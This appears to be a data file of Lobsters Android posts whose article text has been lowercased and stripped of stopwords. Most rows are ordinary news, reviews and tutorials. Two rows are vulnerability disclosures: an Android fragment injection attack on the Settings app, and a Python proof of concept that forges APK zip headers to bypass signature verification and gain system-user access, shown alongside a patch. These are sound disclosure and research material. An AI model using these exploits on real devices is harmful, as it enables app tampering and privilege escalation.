switchtoheaderinner string fragmentname bundle args int direction getfragmentmanager popbackstack backstackprefs fragmentmanagerpopbackstackinclusive fragment f fragmentinstantiate fragmentname args fragmenttransaction transaction getfragmentmanager begintransaction transactionsettransition fragmenttransactiontransitfragmentfade transactionreplace comandroidinternalridprefs f transactioncommitallowingstateloss figure chain call preferenceactivity ending fragmentinstantiate implemented android public static fragment instantiate context context string fname bundle args try class clazz sclassmapget fname clazz null class found cache see real try add clazz contextgetclassloader loadclass fname sclassmapput fname clazz fragment f fragment clazznewinstance args null argssetclassloader fgetclass getclassloader fmarguments args return f figure android implementation fragmentinstantiate vulnerability malicious application invoke exported preferenceactivity class supply android showfragment intent extra order make load arbitrary class goal attacker execute code break android sandbox ie access sensitive information pertaining vulnerable app abuse permission since attacker supply class limited one found class loader vulnerable app android framework class app class attack trivial whitepaper depict couple exploit technique one pretty cool malicious app make preferenceactivity load arbitrary fragment vulnerable app normally loaded inside nonexported activity pratically take natural habitat hazardous area input trusted malicious app control see figure attack outline figure attacking fragment attacking android setting mentioned apps make use preferenceactivity vulnerable targeted setting app since highly privileged application exploiting vulnerability managed successfully subvert integrity app main activity exported comandroidsettingssettings extends preferenceactivity thus vulnerable searched interesting fragment app package one chooselockpassword chooselockpasswordfragment fragment responsible handling credential changing device lock screen subject device management policy fragment natural habitat chooselockpassword activity nonexported normally fragment first asks user insert old credential see figure unless embedding activity supplied intent extra confirmcredentials set false figure normal behavior chooselockpasswordfragment since activity exported parameter easily manipulated malicious app however exploiting fragment injection vulnerability embed chooselockpassword chooselockpasswordfragment inside exported activity comandroidsettingssettings supply malicious data confirmcredentials set false see figure attack outline figure result since exploit requires userintervention used remotely thus requires physical attacker want change credential please note exploiting vulnerability attacker also override device management policy minimum password requirement figure attacking android setting figure user need supply old credential fix google provided patch android kitkat adding new protected api preferenceactivityisvalidfragment called fragment dynamically instantiated preferenceactivity see figure isvalidfragment method must overridden otherwise default implementation throw exception documented sdk reference encourage developer properly implement method eg whitelist since weak implementation keep app vulnerable private void switchtoheaderinner string fragmentname bundle args int direction getfragmentmanager popbackstack backstackprefs fragmentmanagerpopbackstackinclusive isvalidfragment fragmentname throw new illegalargumentexception invalid fragment activity fragmentname fragment f fragmentinstantiate fragmentname args fragmenttransaction transaction getfragmentmanager begintransaction transactionsettransition fragmenttransactiontransitfragmentfade transactionreplace comandroidinternalridprefs f transactioncommitallowingstateloss figure potentially safe fragment instantiation android kitkat vulnerable versionsandroid jelly bean nonvulnerable version android kitkat disclosure reply android security team issue fixed requested status update reply android security team fix progress requested status update reply android security team looking issue disclosure android security team ibm application security research teamthe application security research team research new security threat vulnerability provides regular rule update appscan
540,Lobsters,android,Android,"TextSecure, Now With 10 Million More Users",https://whispersystems.org/blog/cyanogen-integration/?lobsters,textsecure million user,cyanogenmod ten million user integration textsecure technical detail textsecure axolotl forward secrecy ratchet agreement textsecure push api prekey system whisperpush textsecure server future textsecure io client accepting taxdeductible donation moxie marlinspike facebook want get involved signal hiring,open whisper system working advance state art secure communication also reduce friction required ordinary people make use want everyone access advanced secure communication method easy reliable use making normal phone call sending normal text messagewith goal mind working cyanogenmod past month cyanogenmod open source aftermarket android firmware distribution ten million user installs day rapid growth beginning rival microsoft thirdlargest smartphone o distributionas today textsecure protocol begin shipping part cyanogenmod oslevel sm provider effort provide completely transparent endtoend text message encryption usersintegrationwe modified cyanogen smsmms provider speak textsecure protocol outgoing sm message addressed another cyanogenmod textsecure user transparently encrypted sent data channel push message receiving device device decrypt message deliver system normal incoming smsthe result system cyanogenmod user choose use sm app like communication cyanogenmod textsecure user transparently encrypted endtoend data channel without requiring modify work flow allhere encrypted conversation look visible difference nothing change user entire process completely transparent user initiate key exchange wait round trip complete know recipient online simply send message sent immediately everything work like normal asynchronous sm experience even recipient device onthe demo us stock messaging app user could choose install sm app instead effect also adding minimal visual feedback stock cyanogenmod messaging app indicate user expectation privacy base experience change alltechnical user option verify identity key user notified identity key changestechnical detailsthis project incorporates textsecure protocol feature encryption layer textsecure protocol employ axolotl forward secrecy ratchet forward secrecy agreement deniable messagesthe textsecure cryptographic primitive transport protocol textsecure push api make use prekey system obtain forward secrecy asynchronous messaging environmentthe client logic contained cyanogenmod system app called whisperpush system hand outgoing sm message optional delivery cyanogen team run textsecure server whisperpush client federates open whisper system textsecure server client exchange message seamlessly code involved throughout entire stack fully open sourcethe futurethis effort mark beginning transition data channel textsecure transport hopefully open host ongoing opportunity textsecure io client nearing completion textsecure browser extension get underway soon truly crossplatform seamless asynchronous messaging system built open protocol open source software already massive user basecyanogen deserves enormous praise substantial commitment time resource development effort genuine resolve protect user largescale dragnet surveillance truly remarkable world company instead angling collect much information user possible set bar high think expect great thing futurewant help support open whisper system freedom press foundation accepting taxdeductible donation u important project moxie marlinspike december facebookwant get involved signal hiring
541,Lobsters,android,Android,Google’s $179 Moto G puts every single cheap Android phone to shame,http://arstechnica.com/gadgets/2013/12/review-googles-179-moto-g-puts-every-single-cheap-android-phone-to-shame/?lobsters,google moto g put every single cheap android phone shame,moto x phone mvno better musopen musopen build quality enlarge enlarge enlarge enlarge enlarge enlarge screen enlarge corning gorilla glass software enlarge google experience launcher android surprisingly quick droid series phone,moto g left lowbudget relative moto x right andrew cunningham moto g nt much like highend handset spend time many way interesting another android flagship look feel lot like moto x performs lot like highend phone couple year ago cost offcontract similar phone go least unlocked handset obviously nt meant compete flagship trying redefine part market served yearsold phone barelyusable garbage look phone mvno like straight talk wireless offer le see underserved market moto g google motorola attempted put together basic smartphone nt throw quality bus name cheapness giving phone review treatment hit stuff usually battery life however also spend quite bit time answering biggest question moto g phone feel like cost better quick demo moto g rear shell flip cover music courtesy musopen quick demo moto g rear shell flip cover music courtesy musopen spec glance googlemotorola moto g screen ip ppi o android cpu qualcomm snapdragon quadcore cortex ram gpu qualcomm adreno storage gb nand flash networking bluetooth gsm model support gsm umts cdma model support port microusb headphone camera rear camera front camera size mm weight oz g battery starting price offcontract build quality like moto x moto g made solid reassuring plastic us glossy finish around side nice matte finish back g actually subtly larger heavier moto x two phone feel pretty much hand plastic nt bad thing like nexus nexus iphone nokia plastic lumia phone moto g get right phone nt harsh angle chintzy fauxsilver trim design nt make bold statement curved back feel good hand little heavy side perfectly comfortable use extended period weighs five ounce making heavier like smaller iphone even nexus google nt offer moto maker customization service moto g phone black rear shell pried replaced one six colorful replacement back six shell integrated flip cover standard shell run pop removable back may contribute somewhat phone extra thickness sure people appreciate personalization option different colored shell may feel subtly default black shell nexusesque softtouch feel turquoise shell came review unit feel like plain matte plastic flip cover made harder material rough texture neither unpleasant tell difference others noted moto g shell take quite bit force remove probably wo nt taking frequently g lack nicety people come expect phone removable micro sim tray micro sd expansion slot battery emphatically nonremovable seriously sticker everything enlarge moto g curved plastic back feel nice handandrew cunningham enlarge moto g back cover pop replaced one six colorful shell default black cover shown leftandrew cunningham enlarge flip cover also available slightly thicker sturdier regular shell make phone le comfortable holdandrew cunningham enlarge perhaps due removable cover moto g bottom little thicker heavier moto xandrew cunningham enlarge sim tray underneath cover microsd slot battery nt removableandrew cunningham enlarge jiggly power volume button sort annoying phone otherwise wellbuilt build quality excellent price objectively perfect turquoise rear shell google sent little creakiness black shell nt flip cover feel little thicker ruggedized magnet hold cover front phone nt quite strong enough cover make phone le comfortable hold finally power volume button loose enough actually hear jiggling around shake phone little jiggly moto x audibly aside still bestfeeling phone able find price screen enlarge moto g moto x nexus moto g display surprisingly nice priceandrew cunningham cheap gadget terrible display go handinhand time moto g display punch well price class brightness viewing angle good got better contrast brighter color screen nexus looking conventional lcd screen amoled panel like moto x contrast moto g nt quite good color also lack glaring oversaturation sometimes amoled phone got moto x g next notice g thicker phone roughly size g screen smaller big deal since phone still nice enough hold place space might saved one surprising commonality two different phone use corning gorilla glass screen feel good touch reasonably scratchresistant one thing complain motorolasupplied review unit pretty noticeable backlight bleeding way across top screen made noticeable android allblack status bar distracting time may even affect moto g bleed little noticeable watching movie playing game dark background software enlarge android moto gandrew cunningham moto g run version android anything even nearer nexusstyle stock android saw moto x buying phone unlocked clear away carrier bloat leaving bare handful motorola apps one assist offer silence phone driving sleeping meeting another migrate copy data old phone got one fm radio app google standard software basically wireless display feature appears absent yet see show device without dualband wifi support probably explains absence otherwise looking software get nexus phone used nexus phone moto x interface familiar since essentially unchanged standard aosp launcher new nexus google experience launcher run great uptodate google search app grab enabler app somewhere examine little performance section phone nt completely without stuttering lag nt feel smooth higherend phone like moto x nexus better older phone like galaxy nexus cherry pick another handset similar software interesting software moto g run software running soon google promised android update phone end january nt nexusfast nonetheless considerably better get like samsung lg anyone else making android phone especially budgetfriendly android phone google motorola surprisingly quick update moto x kitkat came giving moto g treatment encouraging sign new normal moto phone going forward droid series phone despite sharing similar software underlying hardware continues exist sortoflimbo update promised clearly prioritized tempting think moto g kind nexus jr cheaper way buy clean ui quick software update google reference phone always received however google making promise version android beyond version speculating whether android whatever roll moto phone quickly kitkat pointless exercise point google releasing two new android version per year time next year probably know rely quick update line nexus listing image andrew cunningham
543,Lobsters,android,Android,AIDE: Develop for android -- on the android,http://www.android-ide.com,aide develop android android,,
544,Lobsters,android,Android,Motorola no longer voiding warranties for unlocking Developer Edition Moto X,http://motorola-blog.blogspot.com/2013/11/you-asked-we-listened-announcing.html,motorola longer voiding warranty unlocking developer edition moto x,code moto x de gsm network moto x de verizon droid maxx de verizon moto x,motorola focused delivering best android experience best google service past year worked hard create way user express using mobile device customer purchase developer edition device want flexibility take even tinker operating system may include creating flashing custom build android porting one enthusiast community customer requested bootloader unlock code would void warranty developer edition device excited support developer enthusiast community making two key change developer edition program requesting unlock code longer void device warranty start posting returntofactory software image customer previously purchased developer edition device directly motorola requested bootloader unlock code reinstate warranty effective date original purchase recognize model come printed developer edition across back include moto x de gsm network moto x de verizon droid maxx de verizon addition recovery image shipped factory posted developer enthusiast use image restore device run original factory software hope like change keep telling u think use comment section participate one many g forum moto x strongly believe developer enthusiast community intend keep making change better support posted punit soni software product management
545,Lobsters,android,Android,"Motorola Makes The Moto G Official, A ""Premium"" Phone Starting At $179 Unlocked",http://techcrunch.com/2013/11/13/motorola-makes-the-moto-g-official-a-premium-phone-at-a-price-more-can-afford/,motorola make moto g official premium phone starting unlocked,,motorola held special event today reveal new moto g spiritual sibling moto x way googleowned smartphone maker bring vision customized mobile device future even consumer much affordable pricing setting sight world motorola ceo dennis woodside put event today noting people afford phone today woodside said average worldwide around mark phone offer really bad experience however according woodside using old tech show especially poorly running modern apps woodside cited galaxy fame phone example cheap device made poorly lastgen phone option believe half billion people deserve better woodside said announcing moto g moto g offer experience even rival galaxy modern topend superphones according woodside display ppi resolution hero feature phone outperforms iphone according motorola qualcomm snapdragon ghz processor ram offer allday battery life mean around hour talk time network v claimed iphone ship android guaranteed upgrade coming android january lte board make sense given target market growing developed country lte limited supply nonexistent motorola keeping customization key product custom shell like expensive predecessor new flip shell protect screen back software moto g designed build pure android add value google vanilla o provide user capability motorola vp product management motorola mobility punit soni specifically called foolishness adding complex skin android predictable stance moto google subsidiary obviously soni come google soni also said focused basic optimizing software instead trying jam bunch feature allows punch way weight respect competitor moto g outperforms galaxy boot time browser launch return home making call soni note validation team focusing basic important complicating thing skin software added including motorola assist predictive software feature try develop profile use phone order anticipate need optimal performance also tried focus camera software soni said capable taking excellent photograph every setting possible proof pudding however reserve judgement get chance put pace moto g buyer get additional google drive storage free phone addition come service also fm receiver phone access free music dualsim support select market soni said approach marrying value feature look motorola google combined effort going forward version u unlocked contract free version unlocked still sub price google motorola might able steal away big chunk lowcost feature phone market microsoft aim transition window phone acquisition nokia sale today brazil part europe launch coming week rest europe canada telus koodo within month u number country launch early next year
546,Lobsters,android,Android,Google Takes Its Tracking Into The Real World,http://digiday.com/platforms/google-tracking/,google take tracking real world,oct blog post,tech company large small long trying use smartphones connect consumer online activity real life google telling advertiser way involves tracking consumer smartphone location time wherever go even using google app google betatesting program us smartphone location data determine consumer visit store according agency executive briefed program google employee google connects store visit google search conducted smartphones attempt prove mobile ad fact work google declined multiple request comment someone conduct google mobile search screwdriver instance local hardware store could bid store listing served user pairing person location data database store listing google see person saw ad subsequently visited store google ability make connection predicated user opting location service smartphones thus case subject constant location monitoring dan auerbach staff technologist electronic frontier foundation said user might realize opted constant location tracking opt location service disclosure mechanism apps pretty weak said think gap user expectation apps really easiest google conduct passive location tracking android user since google embedded location tracking software android user opt location service google start collecting location data continuously technologically possible ability dependent cell tower wifi signal strength android currently leading mobile o u percent market share according emarketer little fifth percent u population us android smartphones google also constantly track location iphone user way google apps io apple mobile operating system io behind android u market share percent user per emarketer nearly percent american populace us io smartphone iphone user stop using app continues running background user might realize app continues working much way tab function web browser google namesake io app commonly referred google mobile search continues collecting user location information run background information used determine user visited store whether store visit attributed search conducted app store visit also tracked via google io apps use location service io user open chrome gmail google map app store location deemed store visit location sharing optin apps location tracking nothing new google collecting location data user year putting location data work measuring store visit turn trying sell marketer effectiveness mobile ad google hinted would start measuring storevisit conversion oct blog post already happening whether consumer know http digidaycom
548,Lobsters,android,Android,The Quest to Build a Truly Free Version of Android,http://www.wired.com/wiredenterprise/2013/10/replicant/,quest build truly free version android,android open source project replicant stallman wrote free software foundation website stallman later wrote replicant support different device fdroid,probably heard android free open source entirely truealthough code android open source project indeed open source much software interacts hardware component like gps chip camera graphic proprietary google play gmail google map googlebranded software proprietary requires google permission distribute fact strip proprietary software would nt able much android phonethe team behind replicant want change replicant independent version android proprietary software whatsoever replicant team nt like term open source prefer term free software replicant freedomthe term free software coined early richard stallman original developer unix clone gnu free software mean software respect user freedom community stallman wrote free software foundation website roughly user freedom run copy distribute study change improve software although software considered open source also considered free software according definition stallman argued term imply different value open source movement nonfree software suboptimal solution stallman later wrote free software movement nonfree software social problem free software solution spirit replicant team follows matter accepting unjust power computing generally life say paul kocialkowski lead developer replicant anyone understands value point understand free software matter replicant founded though origin date release htc original android phone people started looking android source code closely find proprietary software say kocialkowski free open source software community quickly realized many proprietary component needed run android various developer started building alternative original replicant team bradley kuhn aaron williamson graziano sorbaioli denis carikli began gathering component single build android free proprietary software carikli founding member still actively involved project responsible quite bit alternative code kocialkowski saystoday replicant support different device based cyanogenmod another fork android support dozen device cyanogenmod get around restriction placed redistributing google apps proprietary code backing original copy user phone installing replacement operating system way user enjoy advantage custom version android without giving proprietary software kocialkowski company looking eliminate proprietary software device completely replicant backup feature every bit code included freeperhaps noticeable absence replicant google play app marketplace android user depend upon apps medium make replicant includes free open source app store called fdroid source code fdroid application apps available fdroid free open source past attempt create replicant market application replace time known android market renamed google play store say kocialkowski attempt nt succeed thankfully fdroid developed time individual hardest task facing replicant developer reverseengineering software support hardware given device without relying proprietary driver constantly trying figure magic happens lockeddown black box nt always succeed say replicant far supporting hardware feature device run biggest challenge facing today lack proper graphic acceleration free software may compromise possibility anything newer android version running device without nonfree blob graphic acceleration say currently investigating use mesa wellknown free software gl library software rendering backends although open source mobile operating system kocialkowski think android still free software community best hope truly free mobile operating system maemo firefoxos ubuntu touch freedom issue android since require nonfree blob support hardware properly say plus android developer device alternative instead wasting time porting new system best flawed android prefer keep going basing replicant upon android also usually proprietary software lurking android phone even use replicant always keep mind everything phone magically becomes free software installing replicant kocialkowski say installing free system preinstalled component remain nonfree bootloader modem firmware etc also say free software trustworthy proprietary software phone present unique security issue operator track user location time comparing time arrival phone signal among different transceivers keep track every phone call message data transfer etc say running replicant advantage security obviously far making phone anything seriously call secure one step towards security really care security avoid using phone still using phone replicant pure free software experience get
549,Lobsters,android,Android,Yet Another Android Master Key Bug,http://www.saurik.com/id/19,yet another android master key bug,yet another android master key bug bluebox security black hat responsible disclosure documented exploit technique bug work second article patch impactor post hash incorrect assumption previous article article bug article bug proof concept said article fixing bug substrate patch backport fixed view repository online gitweb instance hookjava updated impactor cydia impactor,yet another android master key bugearlier year bluebox security announced found bug way android verifies application package tampered thirdparties detail disclosed jeff forristal cto bluebox black hat due attention caused bug quickly foundthis bug disclosed google february became bug bluebox felt responsible disclosure critical bug serious gave google many month allow hardware partner able get everything fixed many month however device fixedat moment attention given bug patch different issue hit android open source project fix bug bug similar ramification group called android security squad documented exploit technique albeit one weaker previous bug previous article first documented bug work well exploit device run code system user previous technique relied finding existing valid package specific property second article showed bug actually powerful firstnow last night source code android released aosp included patch yet another bug signature verification android application package bug somewhat weaker previous one still sufficient support general exploit technique describedin article describe third bug show used providing proofofconcept implementation python new version impactor add support signature bug finally show substrate used patch bug release new version backport fix able get article quickly actually found bug back june sadly think post hash twitter july however week patch committed internally google regardless run hash command post today get hash posted july incorrect assumptionsthe bug underlies exploit similar one analyzed previous article bug specifically look similar original technique bug android security squad aspect first improvement descibed section extreme offset already described zip file format fit together previous article well android signature verification code generally work highlevel problem subject refrain repeating please read article bug article bug detailsso looking back calculation performed c code find data block local header see based four thing offset start header length header fixed size length extra data field bug exploited length name dataoffset localhdroffset klfhlen lfhbuf klfhnamelen lfhbuf klfhextralen process elimination article focus name length local header name interesting used key implementation unzip android central directory instead read fully indexed form hashtable storing pointer local file headersif look implementation code java see something interesting read length extra data local header somehow already length name stored namelength field zipentry object field cache stored reading central directory header nt know entry data start position position entry local header position find length extra data case length differs one coming central header rafstream rafstrm new rafstream raf entrymlocalheaderreloffset datainputstream new datainputstream rafstrm int localextralenorwhatever shortreversebytes isreadshort isclose skip name extra data whatever rafstrmskip entrynamelength localextralenorwhatever make bug exceptionally hilarious large comment sitting carefully pointing length extra data might differ value stored central directory sadly failed make impression writing code skip name field whatever p way exploit set length name local file header size large enough skip length real name defined central directory data used java put modified data want used c data verified java c header name data classesdex java header name data proof conceptas people describing local file header exploit complex pull android police said article bug precise relies fairly complete knowledge structure file going provide proof concept exploit pythonthe key pulling exploit flexibility zip file format often tolerated even simpler library python zipfile library zlib minizip time add file local header data block written immediately central directory written donewhen writing file stream position stream moved position read stream later use central directory mean write extra data file move file pointer around zip library work around change without complaintin case python get access underlying file stream using fp member zipfile object writing multiple copy data adding padding file thereby quite simple finally seek backwards file make change header written usrbinpython import zipfile import struct import sys usage pocbpy newapk oldapk file data zout zipfilezipfile sysargv w zin zipfilezipfile sysargv r replace sysargv new open sysargv r read fp zoutfp name zinnamelist old zinread name name replace zoutwritestr name old zipfilezipdeflated else assert len new len old write header old data record offset zoutwritestr name old zipfilezipstored offset fptell return name length set skip old data fpseek len old len name fpwrite structpack h len name len old old data write new data padded fpseek offset fpwrite new fpwrite len old len new zoutclose zinclose fixing bugas previous article point feel like responsibility provide people ability protect issue describe implement using substrate time alternative point comment onclearly would ideal also disclose bug earlier frankly google known bug since july simply priority earlier responsible disclosure thereby benefit public many android device also locked owner thereby feel morally obligated side hold bug needed course burned final field raf zipfileclass getdeclaredfield mraf rafsetaccessible true final field local zipentryclass getdeclaredfield mlocalheaderreloffset localsetaccessible true final field length zipentryclass getdeclaredfield namelen lengthsetaccessible true method getinputstream zipfileclass getdeclaredmethod getinputstream zipentryclass mshookmethod zipfileclass getinputstream new msmethodalteration zipfile inputstream public inputstream invoked zipfile thiz object args throw throwable zipentry entry zipentry args randomaccessfile raf randomaccessfile rafget thiz synchronized raf rafseek localgetlong entry rafseek int length shortreversebytes rafreadshort length lengthgetint entry throw new zipexception return invoke thiz args fix issue similar fix published bug code extension look similar new code line check name length local header match one central directory see patch backport reference note mistake patch found fixed publishing article int length shortreversebytes rafreadshort length lengthgetint entry throw new zipexception complete source code extension clone git repository git gitsaurikcombackportgit view repository online using gitweb instance use direct link hookjava user want install apk get cydia gallery inside substrate updated impactorfor user hoping endtoend implementation bug released updated build cydia impactor autodetect usability use system exploit available actually check bug first likely present either two bug use impactor get access system user device run impactor select start telnetd system port click start telnet port device run id find running system user point might able find way upgrade full root accesswhat interesting course see adoption curve fix three bug mainly work io bug fixed centrally quickly comparison even though google first bug carefully disclosed bluebox february nexus device line see fix july part many device even today yet patched story second bug even worse hoping third bug cause update
550,Lobsters,android,Android,Quick Musings on Android 4.4,http://commonsware.com/blog/2013/10/31/quick-musings-android-4p4.html,quick musing android,quick musing android blogged previously book migration guide add permission release note making comeback version detail release note release note api difference report android app development training,quick musing android based quick review documented change android preliminary thought regarding area potential incompatibility app beyond sm change blogged previously particular relevance reader book using webview start testing app android immediately webview implementation overhauled chromium core theory app change android targetsdkversion le want doublecheck soon possible start considering migrating android targetsdkversion please read migration guide closely lot changed also please note switching loadurl javascript evaluatejavascript apps targetting kitkat later load j url result url replace content current added readexternalstorage permission app yet writeexternalstorage accepting uri value thirdparty apps add readexternalstorage permission otherwise may able access content uri value point external storage exception rule getexternalfilesdir getexternalcachedir new plural equivalent eg getexternalfilesdirs require readexternalstorage basically stick application specific location need permission write anywhere else external storage first crack external storage policy occurred getexternalfilesdirs getexternalcachedirs method context return multiple value representing location multiple form external storage eg onboard flash partition removable card course requires manufacturer actually support since nexus device removable card support nearterm way might see behaves via usb otg accessing thumb drive something sure thing plural equivalent classic method environment eg getexternalstoragedirectory direction multiple form external storage unlikely completely solve problem area release note indicate android aggressively protect system memory apps consuming large amount concrete explanation might mean probably misstated release note say multiple service start network connectivity change android launch service serially small group avoid peak memory however service respond directly thing like connectivity running already change handled via listener requiring alreadyrunning service broadcast intent necessarily imply anything service hence least moment interpreting release note would make bit sense mean though apps relying upon rapid response system broadcast may encounter unexpected delay target api level higher need override isvalidfragment preferenceactivity validate supplied fragment class name indeed something displayed cuff feel like hack deal security flaw note new density known displaymetrics really need worry working density bucket directly java code seriously anal pixel perfection drawable resource contentprovider intentfilter support new document provider framework unclear mean provider anything using alarmmanager need bear mind set setrepeating start becoming inexact target api level sync adapter similarly scheduling interest saving power app ops seems making comeback since see kitkat source code available reserving judgement get hand android hardware arm emulator make babydeity cry likely plenty area compatibility concern area beyond scope book eg medium change review kitkat version detail learn change occur change android targetsdkversion higher addition release note release note api difference report learn secondgeneration android app development kotlin android jetpack android app development training oct
551,Lobsters,android,Android,Nexus 5,https://play.google.com/store/devices/details?id=nexus_5_black_32gb,nexus,order history,error occurred cancelling delivery please try lateran error occurred processing purchase please try lateran error occurred cancelling repair please try lateryour promo code applied order seen checkoutcould load specified resourcedevices google play moved new google store device add basket must preferred care plan add remove preferred care device match already basket buy device separate orderwe ca nt ship item cart try purchasing separatelyunfortunately could nt add cart limit many buyunfortunately allow one trade per order please remove trade add pixel cartyour order still processed check order history placing another orderyou google store india basket clearedyour delivery address changedwe nt recognise address please make sure spelled correctlypage expired please refresh pagefailed email dispatch label please try laterdispatch label email sentsomething went wrong please try againthere problem completing repair order please submit order refresh pagecreate store credit account failed please retrydismiss
552,Lobsters,android,Android,Signing email with an NFC smart card on Android,http://nelenkov.blogspot.com/2013/10/signing-email-with-nfc-smart-card.html,signing email nfc smart card android,discussed nfc smart card previous post iso know software emulation securing email pgp smime signing smime standard pkcs cm der using smime android hardwarebacked spongy castle twist javamail available required sample app oauth using musclecard sign email musclecard recent fork load gpj initialized personalize using musclecard android summary,last time discussed access sim card use secure element enhance android application one main problem approach since sim card controlled mno applet running commercial sim approved needle say considerably limit flexibility fortunately nfcenabled android device communicate practically external contactless smart card install anything let explore nfc smart card used sign email android nfc smart card discussed previous post smart card secure execution environment single chip typically packaged creditcard sized plastic package smaller form factor used sim card traditionally smart card connect card reader using number goldplated contact pad pad used provide power card establish serial communication io interface size electrical characteristic communication protocol defined series iso standard traditional card referred contact smart card contactless card hand need physical contact reader draw power communicate reader using rf induction communication protocol tcl use defined iso similar protocol used contact card smart card contactless interface exist dualinterface card contact antenna rf communication majority underlying rf standard used varies manufacturer type type b common know nfc three standard mode operation readerwriter rw peertopeer card emulation ce mode nfcenabled android device support rw mode provide ce either using physical secure element se software emulation needed communicate contactless smart card basic rw mode used practically android device nfc support functionality provided isodep class provides basic commandresponse exchange functionality transceive method higher level protocol need implemented client application securing email quite new service trying reinvent secure email recent year trying make easy user taking care key management shifting cryptographic operation server recent event reconfirmed introducing intermediary good idea communication two party remain secure secure email hardly new idea oldschool way implementing relies pubic key cryptography party responsible protecting private key verifying public key counterpart match actual identity method used verify identity biggest difference two major secure email standard use today pgp smime pgp relies called web trust everyone vouch identity someone signing key usually meeting person key signature considered trustworthy smime hand relies pki certificate issuing authority ca relied upon verify identity issuing certificate pgp advantage decentralized make harder break system compromising single entity happened number public ca recent year however requires much user involvement especially challenging new user additionally many commercial open source pgp implementation exist mainstream email client support pgp box require installation plugins additional software hand major proprietary outlook variant mailapp etc open source thunderbird email client builtin mature smime implementation use smime example lot easier get started test technique described used implement pgpsecured email well let first discus smime implemented signing smime smime securemultipurpose internet mail extension standard defines include signed andor encrypted content email message specified procedure creating signed encrypted enveloped content mime medium type use adding message example signed message would part contenttype smimetypesigneddata contains message signature associated attribute email client support smime like web mail apps would look like attachment called smimecompliant client would instead parse verify signature display visual indication showing signature verification status interesting question however stand pkcs predecessor current cryptographic message syntax cm cm defines structure used package signed authenticated encrypted content related attribute pki standard structure based encoded binary using der like certificate crls sequence structure turn composed yet structure basically sequence way let try look higherlevel one used signed email cm structure describing signed content predictably called signeddata look like signeddata sequence version cmsversion digestalgorithms digestalgorithmidentifiers encapcontentinfo encapsulatedcontentinfo certificate implicit certificateset optional crls implicit revocationinfochoices optional signerinfos signerinfos digestalgorithms contains oids hash algorithm used produce signature one signer encapcontentinfo describes data signed optionally contain actual data optional certificate crls field intended help verify signer certificate absent verifier responsible collecting mean interesting part signerinfos contains actual signature information signer look like signerinfo sequence version cmsversion sid signeridentifier digestalgorithm digestalgorithmidentifier signedattrs implicit signedattributes optional signaturealgorithm signaturealgorithmidentifier signature signaturevalue unsignedattrs implicit unsignedattributes optional besides signature value algorithm used signedinfo contains signer identifier used find exact certificate used number optional signed unsigned attribute signed attribute included producing signature value contain additional information signature signing time unsigned attribute covered signature value contain signed data counter signature additional signature signature value sum order produce smime signed message need sign email content attribute generate signedinfo structure wrap signeddata der encode result add message using appropriate mime type sound easy right let done android using smime android platform need two thing order generate smime message cryptographic provider perform actual signing using asymmetric key parsergenerator order generate signeddata structure android jce provider support rsa recently even hardwarebacked key left generator derber around age quite parsersgenerators practically useful choice many one really generates code directly module found related standard library implement necessary part building available component android major cryptographic library openssl bouncy castle contain parsergenerators support cm related api public though need include library usual turn spongy castle provides bouncy castle functionality different namespace order able process cm generate smime message need optional scpkix scmail package first one contains pkix cm related class second one implement smime however twist android lack class required generating smime message may know android implementation standard java apis exception notably gui widget related awt swing package rarely missed android widget graphic library however besides widget awt contains class related mime medium type well unfortunately used library deal mime object javamail bouncy castle smime implementation javamail version include alternative awt implementation repackaged android available time since use nonstandard package name dropin replacement applies spongy castle well source code modification required order get scmail work javamailandroid library sorted generating smime message android matter finding signer key certificate using proper bouncy castle javamail apis generate send message privatekey signerkey keychaingetprivatekey ctx smime chain keychaingetcertificatechain ctx smime signercert chain cacert chain smimesignedgenerator gen new smimesignedgenerator genaddsignerinfogenerator new jcasimplesignerinfogeneratorbuilder setprovider androidopenssl setsignedattributegenerator new attributetable signedattrs build signerkey signercert store cert new jcacertstore arraysaslist signercert cacert genaddcertificates cert mimemultipart mm gengenerate mimemsg sc mimemessage signedmessage new mimemessage session enumeration header mimemsggetallheaderlines headershasmoreelements signedmessageaddheaderline string headersnextelement signedmessagesetcontent mm signedmessagesavechanges transportsend signedmessage first get signer key certificate using keychain api create smime generator specifying key certificate signature algorithm signed attribute note specify androidopenssl provider explicitly one use hardwarebacked key required changed default provider order installing spongy castle default androidopenssl preferred jce provider add certificate want include generated signeddata generate multipart mime message includes original message mimemsg signature finally send message using javamail transport class javamail session initialization omitted example see sample app set use gmail smtp server requires gmail account password specified little work replaced oauth token obtain system accountmanager smart card using musclecard sign email order sign email using key stored smart card need thing dualinterface smart card support rsa key crypto applet allows u sign data key sort middleware expose card functionality standard crypto api recent dualinterface javacards fulfill requirement using nxp support javacard rsa key come open source crypto applet though unfortunately choice quite limited one fullfeatured well supported middleware library venerable musclecard applet using one fairly recent fork updated support javacard extended apdus load applet card need globalplatformcompatible loader application like gpj course cardmanager key initialized personalize generating importing key certificate card used application support pkcs example thunderbird firefox card dualinterface practically smart card reader used desktop opensc pkcs module loaded thunderbird card show security device dialog like certificate installed card email subject alternative name extension able send signed encrypted email recipient certificate course achieve thing android using musclecard android android nt support pkcs module order expose card crypto functionality could implement custom jce provider provides cardbacked implementation signature keystrore engine class quite bit work though since targeting bouncy castle smime api get away implementing contentsigner interface provides outputstream client write data signed algorithmidentifer signature method used getsignature method return actual signature value musclecardbacked implementation could look like class musclecardcontentsigner implement contentsigner private bytearrayoutputstream baos new bytearrayoutputstream private musclecard msc private string pin override public byte getsignature mscselect mscverifypin pin byte data baostobytearray baosreset return mscsign data musclecard class middleware encapsulates card rsa signature functionality implemented sending required command apdus operation using android isodep api aggregating converting result needed example verifypin implemented like class musclecard private isodep tag public boolean verifypin string pin throw ioexception string cmd stringformat pinlength tohex pingetbytes ascii responseapdu rapdu new responseapdu tagtransceive fromhex cmd rapdugetsw swsuccess return false return true signing little complicated involves creating updating temporary io object follows principle since applet support padding hashing need generate pad pkcs ps signature block android send complete data card finally need plug signer implementation bouncy castle cm generator contentsigner msccs new musclecardcontentsigner musclecard pin genaddsignerinfogenerator new jcasignerinfogeneratorbuilder new jcadigestcalculatorproviderbuilder setprovider sc build build msccs cardcert signed message generated exactly like using local key store key course caveat since apps control nfc connection established sign data card picked device received intent live isodep instance additionally since signing take second need make sure connection broken placing device top card use sort awkward case card slot implementation also take shortcut hardcoding certificate object id size well card pin remedied little code ui homebrew smime client shown import pkcs file system credential store sign email using imported key sign nfc button enabled compatible card detected easiest way verify email signature send message desktop client support smime also android email apps support smime setup bit challenging often use trust key store also dump generated message external storage using mimemessagewriteto parse cm structure using openssl cm command openssl cm cmsout signedmessage noout print cmscontentinfo contenttype dsigneddata version 